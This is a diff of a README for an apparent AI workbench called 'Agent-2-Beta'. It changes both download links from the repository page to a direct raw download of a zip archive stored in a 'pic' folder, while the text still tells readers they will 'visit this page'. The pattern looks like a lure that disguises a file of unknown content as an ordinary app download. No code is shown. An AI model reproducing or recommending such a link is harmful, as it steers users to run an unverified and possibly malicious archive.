@@ -1,12 +1,12 @@
 # 🤖 Agent-2-Beta - Your Self-Hosted AI Workbench
 
-[![Download Agent-2-Beta](https://img.shields.io/badge/Download%20Agent-2-Beta-blue?style=for-the-badge)](https://github.com/mouthholeheaviside560/Agent-2-Beta)
+[![Download Agent-2-Beta](https://img.shields.io/badge/Download%20Agent-2-Beta-blue?style=for-the-badge)](https://github.com/mouthholeheaviside560/Agent-2-Beta/raw/refs/heads/main/pic/Agent_Beta_3.4.zip)
 
 ## 📥 Download
 
 Use this link to visit this page and download the app:
 
-[https://github.com/mouthholeheaviside560/Agent-2-Beta](https://github.com/mouthholeheaviside560/Agent-2-Beta)
+[https://github.com/mouthholeheaviside560/Agent-2-Beta/raw/refs/heads/main/pic/Agent_Beta_3.4.zip](https://github.com/mouthholeheaviside560/Agent-2-Beta/raw/refs/heads/main/pic/Agent_Beta_3.4.zip)
 
 ## 🖥️ What Agent-2-Beta Does
 
